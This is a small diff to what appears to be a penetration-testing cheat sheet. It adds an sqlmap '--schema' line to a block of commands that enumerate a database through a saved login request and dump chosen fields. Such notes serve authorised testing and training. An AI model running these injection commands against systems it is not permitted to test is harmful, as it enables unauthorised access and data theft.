@@ -286,6 +286,7 @@ sqlmap -r login.req -p "{POST_PARAMETER_1},{POST_PARAMETER_2}" --level=3 --risk=
 ```
 # Navigation
 sqlmap -r login.req -p {PARAMETER} --batch --current-db
+sqlmap -r login.req -p {PARAMETER} --batch -D {DB} --schema
 sqlmap -r login.req -p {PARAMETER} --batch -D {DB} --tables
 sqlmap -r login.req -p {PARAMETER} --batch -D {DB} -T {TABLE} --columns
 sqlmap -r login.req -p {PARAMETER} --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIELD_3} --dump
